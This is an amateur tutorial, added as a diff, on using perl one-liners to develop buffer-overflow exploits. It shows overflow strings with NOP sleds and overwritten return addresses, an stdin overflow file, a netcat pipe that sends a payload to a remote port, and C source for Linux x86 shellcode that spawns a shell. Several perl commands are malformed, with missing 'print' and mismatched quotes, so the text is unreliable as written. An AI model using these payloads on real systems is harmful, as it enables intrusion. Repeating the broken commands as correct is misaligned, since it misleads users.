@@ -1,0 +1,88 @@
+************** priestmasters perl for vuln developers ******************
+
+Command line perl is a very effective tool for vuln developement. It's
+very easy to concatenate, repeat data and build proof of concept
+exploit. You need very long if you always compile and change a
+C program. An example:
+
+perl -e 'print "A"x100'
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+print 100 'A' characters. Useful for buffer overflow exploits.
+
+Example:
+
+./vuln `perl -e "A"x100'`
+
+Start the vuln program and print 100 "A" as first parameter.
+
+./vuln `perl -e "A"x100'` `perl -e "B"x1500'`
+
+Start the vuln program. `perl -e "A"x100'` is the first parameter and
+`perl -e "B"x1500'` is the second one. The whitespace between the perl
+commandos is important if you have more parameters.
+
+You also can concatenate some strings:
+
+./vuln `perl -e '"A"x256 . "\x90\xff\xff\xbf"'`
+
+print 256 "A" and 0xbfffff90 in little endian (intel platforms). 
+
+If you need shellcode in your buffer make something like that:
+
+./vuln `perl -e "\x90"x20``cat shellcode``perl -e 'print "\x41\x42\x43\x44"'`
+
+Print 20 nops (\x90) then add file shellcode (it's a file with binary shellcode 
+data) and then overflow a return address for example with 0x44434241. This
+string is only one parameter, because there is nowhere a space character
+between the commando subtitutions (`xyz` is commando substitution).
+If you need binary shellcode data, download a shellcode and make a
+print("%s", shellcode). Cat it to stdout (./shellcode > shellcodebin.
+
+Example:
+
+//* Linux x86 28 byte shellcode. by bob@dtors.net */
+
+// File shellcode.c
+#include <stdio.h>
+
+// The shellcode string
+char shellcode[]=
+                "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
+                "\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80";
+int
+main()
+{
+	// This code launch the shellcode, but we need it in binary
+        /* void (*dsr) ();
+        (long) dsr = &shellcode;
+        printf("Size: %d bytes.\n", sizeof(shellcode));
+        dsr(); */
+
+	printf("%s", shellcode);
+}
+
+hack@exploit:~ > gcc shellcode.c -o shellcode ; ./shellcode > shellcodebin 
+
+Another way to overflow is this: (for vulnerable function likes gets(),
+scanf(), ...):
+
+perl -e 'print "\x90"x100' > buf
+cat shellcode >> buf
+perl -e 'print "\x90\xff\xff\xbf"' >> buf
+
+and then start your vuln program: ./vuln < buf.
+
+This is the easiest way to overflow stdin.
+
+Now an example for remote exploits. You can pipe it to netcat.
+
+perl -e "A"x265 . "\x12\xff\xff\xbf" | nc 192.168.150.2 99
+
+for a vulnerable program on port 99.
+
+***************************************************************************
+
+I hope this helps a little bit. Sorry for my english. If you have
+questions or you find a mistake, please mail me. <priest@priestmaster.org> My URL is http://www.priestmaster.org
